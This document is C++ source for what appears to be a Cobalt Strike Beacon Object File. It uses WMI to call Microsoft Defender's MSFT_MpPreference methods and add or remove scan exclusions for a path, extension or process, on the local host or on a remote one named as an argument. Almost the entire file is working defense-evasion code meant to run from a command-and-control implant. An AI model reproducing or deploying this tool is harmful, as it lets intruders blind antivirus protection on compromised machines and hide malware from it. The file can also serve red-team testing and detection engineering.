#ifndef UNICODE
#define UNICODE
#endif

#ifndef _NO_CRT_STDIO_INLINE
#define _NO_CRT_STDIO_INLINE
#endif

#include <windows.h>
#include <wbemidl.h>
#include <wchar.h>
#include <comdef.h>
#include "headers/beacon.h"
#include "headers/defines.h"
#include "headers/win32.h"

static unsigned short int usStepIndex = 1;
static const wchar_t* methodoptions[] = { ADD_EXCLUSION, REMOVE_EXCLUSION };
static const wchar_t* methodtypes[] = { EXCLUSION_PATH, EXCLUSION_EXTENSION, EXCLUSION_PROCESS };

extern "C" void dumpFormatAllocation(formatp* formatAllocationData)
{
    char*   outputString = NULL;
    int     sizeOfObject = 0;

    outputString = BeaconFormatToString(formatAllocationData, &sizeOfObject);
    BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
    BeaconFormatFree(formatAllocationData);

    return;
}

extern "C" void create(char* args, int len)
{
    formatp fpObject;
    datap   pData;

    BeaconFormatAlloc(&fpObject, 64 * 1024);
    BeaconDataParse(&pData, args, len);

    INT     iDefenderMethod     = BeaconDataInt(&pData) - 1;
    INT     iDefenderOption     = BeaconDataInt(&pData) - 1;
    WCHAR*  itemToExclude       = NULL;
    WCHAR*  locationToMod       = NULL;
    WCHAR   endpointPath[256]   = { 0 };

    itemToExclude = (wchar_t*)BeaconDataExtract(&pData, NULL);

    if (INT iRemainingData = BeaconDataLength(&pData) > 0)
    {
        locationToMod = (wchar_t*)BeaconDataExtract(&pData, NULL);
        MSVCRT$_snwprintf(endpointPath, 255, L"\\\\%s\\%s", locationToMod, DEFENDER_NAMESPACE);
    }
    else
    {
        locationToMod = L"\\\\.";
        MSVCRT$_snwprintf(endpointPath, 255, L"%s\\%s", locationToMod, DEFENDER_NAMESPACE);
    }

    HRESULT hResult;
    
    BeaconFormatPrintf(&fpObject, "[STEP %02hu] CoInitialize ", usStepIndex);
    hResult = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED);
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] CoInitializeSecurity ", usStepIndex);
    hResult = OLE32$CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure %ul\n", hResult);
        dumpFormatAllocation(&fpObject);

        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    IWbemLocator* pWbemLocator = NULL;

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] CoCreateInstance invocation ", usStepIndex);
    hResult = OLE32$CoCreateInstance(
        g_CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        g_IID_IWbemLocator,
        (LPVOID*)&pWbemLocator
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    IWbemServices* pWbemServices = NULL;
    BSTR bstrDefenderNamespace = OLEAUT32$SysAllocString(endpointPath);

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Connection invocation ", usStepIndex);
    hResult = pWbemLocator->ConnectServer(
        bstrDefenderNamespace,
        NULL,
        NULL,
        0,
        NULL,
        0,
        0,
        &pWbemServices
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] CoSetProxyBlanket invocation ", usStepIndex);
    hResult = OLE32$CoSetProxyBlanket(
        pWbemServices,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    
    IWbemClassObject* pIWbemClassObject = NULL;
    BSTR bstrDefenderClassName = OLEAUT32$SysAllocString(DEFENDER_CLASSNAME);

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] GetObjectW resolution ", usStepIndex);
    hResult = pWbemServices->GetObjectW(
        bstrDefenderClassName,
        0,
        NULL,
        (IWbemClassObject**)&pIWbemClassObject,
        NULL
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }
    
    IWbemClassObject* pInputParametersDefinition = NULL;
    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Get method instance invocation ", usStepIndex);
    hResult = pIWbemClassObject->GetMethod(
        methodoptions[iDefenderMethod],
        0,
        &pInputParametersDefinition,
        NULL
    );
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pIWbemClassObject)
        {
            pIWbemClassObject->Release();
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    
    IWbemClassObject* pIwbemClassInstance = NULL;
    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Create instance for later usage ", usStepIndex);
    hResult = pInputParametersDefinition->SpawnInstance(0, &pIwbemClassInstance);
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pIwbemClassInstance)
        {
            pIwbemClassInstance->Release();
        }
        if (pInputParametersDefinition)
        {
            pInputParametersDefinition->Release();
        }
        if (pIWbemClassObject)
        {
            pIWbemClassObject->Release();
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    SAFEARRAY* pSafeArray;
    SAFEARRAYBOUND saSafeArrayBoundary[1];
    saSafeArrayBoundary[0].lLbound = 0;
    saSafeArrayBoundary[0].cElements = 1;

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Create SAFEARRAY for arguments ", usStepIndex);
    pSafeArray = OLEAUT32$SafeArrayCreate(VT_BSTR, 1, saSafeArrayBoundary);
    if (pSafeArray == NULL)
    {
        BeaconFormatPrintf(&fpObject, "-> Failure\n");
        dumpFormatAllocation(&fpObject);

        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pIwbemClassInstance)
        {
            pIwbemClassInstance->Release();
        }
        if (pInputParametersDefinition)
        {
            pInputParametersDefinition->Release();
        }
        if (pIWbemClassObject)
        {
            pIWbemClassObject->Release();
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");

        usStepIndex++;
    }

    // This is what will eventually be needed for "adding" items from an argument
    BSTR exceptions_item = OLEAUT32$SysAllocString(itemToExclude);

    for (long i = 0; i < (LONG)saSafeArrayBoundary[0].cElements; ++i)
    {
        BeaconFormatPrintf(&fpObject, "[STEP %02hu] Add string to SAFEARRAY ", usStepIndex);
        hResult = OLEAUT32$SafeArrayPutElement(pSafeArray, &i, exceptions_item);
        if (FAILED(hResult))
        {
            BeaconFormatPrintf(&fpObject, "-> Failed");
            dumpFormatAllocation(&fpObject);
            
            if (pSafeArray)
            {
                OLEAUT32$SafeArrayDestroy(pSafeArray);
            }
            if (exceptions_item)
            {
                OLEAUT32$SysFreeString(exceptions_item);
            }
            if (bstrDefenderClassName)
            {
                OLEAUT32$SysFreeString(bstrDefenderClassName);
            }
            if (bstrDefenderNamespace)
            {
                OLEAUT32$SysFreeString(bstrDefenderNamespace);
            }
            if (pIwbemClassInstance)
            {
                pIwbemClassInstance->Release();
            }
            if (pInputParametersDefinition)
            {
                pInputParametersDefinition->Release();
            }
            if (pIWbemClassObject)
            {
                pIWbemClassObject->Release();
            }
            if (pWbemServices)
            {
                pWbemServices->Release();
            }
            if (pWbemLocator)
            {
                pWbemLocator->Release();
            }
            OLE32$CoUninitialize();

            return;
        }
        else 
        {
            BeaconFormatPrintf(&fpObject, "\n");
            
            usStepIndex++;
        }
    }

    VARIANT vtCmdLine;
    OLEAUT32$VariantInit(&vtCmdLine);
    vtCmdLine.vt = VT_ARRAY | VT_BSTR;
    vtCmdLine.parray = pSafeArray;

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Calling PUT method ", usStepIndex);
    hResult = pIwbemClassInstance->Put(methodtypes[iDefenderOption], 0, &vtCmdLine, 0);
    if (FAILED(hResult))
    {
        BeaconFormatPrintf(&fpObject, "-> Failed\n");
        dumpFormatAllocation(&fpObject);

        if (exceptions_item)
        {
            OLEAUT32$SysFreeString(exceptions_item);
        }
        if (pSafeArray)
        {
            OLEAUT32$SafeArrayDestroy(pSafeArray);
        }
        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pIwbemClassInstance)
        {
            pIwbemClassInstance->Release();
        }
        if (pInputParametersDefinition)
        {
            pInputParametersDefinition->Release();
        }
        if (pIWbemClassObject)
        {
            pIWbemClassObject->Release();
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();
    }
    else
    {
        BeaconFormatPrintf(&fpObject, "\n");
        
        usStepIndex++;
    }

    BeaconFormatPrintf(&fpObject, "[STEP %02hu] Executing MSFT_MPPreference's chosen method ", usStepIndex);
    BSTR bstrMSFT_MPPreference = OLEAUT32$SysAllocString(DEFENDER_CLASSNAME);
    BSTR bstrMSFT_Method = OLEAUT32$SysAllocString(methodoptions[iDefenderMethod]);
    hResult = pWbemServices->ExecMethod(bstrMSFT_MPPreference, bstrMSFT_Method, 0, NULL, pIwbemClassInstance, NULL, NULL);
    if (hResult != WBEM_S_NO_ERROR)
    {
        BeaconFormatPrintf(&fpObject, "-> Failed\n");
        dumpFormatAllocation(&fpObject);

        if (bstrMSFT_Method)
        {
            OLEAUT32$SysFreeString(bstrMSFT_Method);
        }
        if (bstrMSFT_MPPreference)
        {
            OLEAUT32$SysFreeString(bstrMSFT_MPPreference);
        }
        if (exceptions_item)
        {
            OLEAUT32$SysFreeString(exceptions_item);
        }
        if (pSafeArray)
        {
            OLEAUT32$SafeArrayDestroy(pSafeArray);
        }
        if (bstrDefenderClassName)
        {
            OLEAUT32$SysFreeString(bstrDefenderClassName);
        }
        if (bstrDefenderNamespace)
        {
            OLEAUT32$SysFreeString(bstrDefenderNamespace);
        }
        if (pIwbemClassInstance)
        {
            pIwbemClassInstance->Release();
        }
        if (pInputParametersDefinition)
        {
            pInputParametersDefinition->Release();
        }
        if (pIWbemClassObject)
        {
            pIWbemClassObject->Release();
        }
        if (pWbemServices)
        {
            pWbemServices->Release();
        }
        if (pWbemLocator)
        {
            pWbemLocator->Release();
        }
        OLE32$CoUninitialize();

        return;
    }
    else
    {
        usStepIndex++;
        BeaconFormatPrintf(&fpObject, "\n");
        BeaconFormatPrintf(
            &fpObject, 
            "[STEP %02hu] Excution of the %S method for allowing %S via %S has executed successfully\n", 
            usStepIndex, 
            (wchar_t*)bstrMSFT_Method, 
            (wchar_t*)itemToExclude, 
            (wchar_t*)methodtypes[iDefenderOption]
        );
    }
    
    INT freeIndex = 1;

    if (bstrMSFT_Method)
    {
        OLEAUT32$SysFreeString(bstrMSFT_Method);
        freeIndex++;
    }
    if (bstrMSFT_MPPreference)
    {
        OLEAUT32$SysFreeString(bstrMSFT_MPPreference);
        freeIndex++;
    }
    if (exceptions_item)
    {
        OLEAUT32$SysFreeString(exceptions_item);
        freeIndex++;
    }
    if (bstrDefenderClassName)
    {
        OLEAUT32$SysFreeString(bstrDefenderClassName);
        freeIndex++;
    }
    if (bstrDefenderNamespace)
    {
        OLEAUT32$SysFreeString(bstrDefenderNamespace);
        freeIndex++;
    }
    if (pIwbemClassInstance)
    {
        pIwbemClassInstance->Release();
        freeIndex++;
    }
    if (pInputParametersDefinition)
    {
        pInputParametersDefinition->Release();
        freeIndex++;
    }
    if (pIWbemClassObject)
    {
        pIWbemClassObject->Release();
        freeIndex++;
    }
    if (pWbemServices)
    {
        pWbemServices->Release();
        freeIndex++;
    }
    if (pWbemLocator)
    {
        pWbemLocator->Release();
        freeIndex++;
    }
    if (pSafeArray)
    {
        OLEAUT32$SafeArrayDestroy(pSafeArray);
        freeIndex++;
    }

    OLE32$CoUninitialize();
    freeIndex++;

    BeaconFormatPrintf(
            &fpObject, 
            "[STEP %02hu] Freeing of %02d objects has finished successfully.\n", 
            ++usStepIndex,
            freeIndex
    );
    
    dumpFormatAllocation(&fpObject);
    
    return;
}

extern "C" void go(char* args, int len)
{
    create(args, len);

    return;
}